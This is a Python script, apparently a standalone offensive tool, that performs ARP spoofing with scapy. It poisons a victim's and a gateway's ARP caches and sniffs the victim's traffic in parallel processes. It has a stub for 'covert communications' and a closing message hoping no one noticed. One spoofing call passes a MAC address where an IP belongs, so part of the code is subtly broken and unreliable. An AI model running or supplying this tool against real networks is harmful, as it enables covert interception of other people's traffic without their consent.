import warnings
warnings.filterwarnings('ignore', category=Warning)


import scapy.all as scapy
import sys
import argparse
import multiprocessing


class MITM:
    def __init__(self, interface = None, gateway_ip=None, victim_ip=None):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.victim_ip = victim_ip

        self.gateway_mac = None
        self.victim_mac = None

    def get_mac(self, ip_addr):
        # create an arp packet, setting ip_addr as destination
        arp_req = scapy.ARP(pdst = ip_addr)

        # set the destination mac to broadcast
        broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")

        # combine both
        arp_req_broadcast = broadcast / arp_req

        # send the packet
        answers = scapy.srp(arp_req_broadcast, timeout = 10, verbose = False, iface = self.interface)[0]

        # get the mac from the answers
        return answers[0][1].hwsrc

    def spoof(self):
        # tell the victim that i am the gateway
        scapy.sendp(scapy.ARP(op = 2, pdst = self.victim_ip, psrc = self.gateway_mac, hwdst = self.victim_mac), iface=self.interface, verbose = False)

        # tell the gateway that i am the victim
        scapy.sendp(scapy.ARP(op = 2, pdst = self.gateway_ip, psrc = self.victim_ip, hwdst = self.gateway_mac), iface=self.interface, verbose = False)

    def process_packet(self, packet):
        # Check if the packet is interesting (e.g., between victim and gateway)
        if (packet.haslayer(scapy.IP) and
            packet.haslayer(scapy.Ether) and
            packet[scapy.IP].src == self.victim_ip and
            # packet[scapy.IP].dst == self.gateway_ip and
            packet[scapy.Ether].src == self.victim_mac
            # and packet[scapy.Ether].dst == self.gateway_mac
            ):

            print(packet.summary())

            ## do the covert communications here


    def shutdown(self):
        print("[+] Exiting! Hope none noticed it!")
        sys.exit(0)


    def capture_packets(self):
        # Use Scapy's packet capturing to intercept and print packets
        try:
            scapy.sniff(iface=self.interface, prn=self.process_packet, store=False)
        except KeyboardInterrupt:
            self.shutdown()


    def spoof_process(self):
        while True:
            try:
                self.spoof()
            except KeyboardInterrupt:
                self.shutdown()

    def start(self):
        try:
            self.victim_mac = self.get_mac(self.victim_ip)
            print("[+] Victim Mac is", self.victim_mac)
        except Exception as e:
            print("Error: Could not find Victim MAC: ", str(e))
            print("[+] Exiting")
            sys.exit(1)

        try:
            self.gateway_mac = self.get_mac(self.gateway_ip)
            print("[+] Gateway Mac is", self.gateway_mac)
        except Exception as e:
            print("Error: Could not find gateway MAC: ", str(e))
            print("[+] Exiting")
            sys.exit(1)

        print("[+] Spamming spoofing packets")

        # Start a process for packet capturing
        packet_capture_process = multiprocessing.Process(target=self.capture_packets)
        packet_capture_process.daemon = True
        packet_capture_process.start()

        # Start a process for continuous spoofing
        spoofing_process = multiprocessing.Process(target=self.spoof_process)
        spoofing_process.daemon = True
        spoofing_process.start()

        # Wait for both processes to finish
        packet_capture_process.join()
        spoofing_process.join()

    def __call__(self):
        self.start()

if __name__ == "__main__":

    parser = argparse.ArgumentParser()

    parser.add_argument("-i", "--interface", help="the interface to use", required=True)
    parser.add_argument("-t", "--target", help="the target ip to spoof", required=True)
    parser.add_argument("-g", "--gateway", help="the gateway ip for the network", required=True)

    args=parser.parse_args()

    mitm = MITM(gateway_ip=args.gateway, victim_ip=args.target, interface=args.interface)
    mitm()
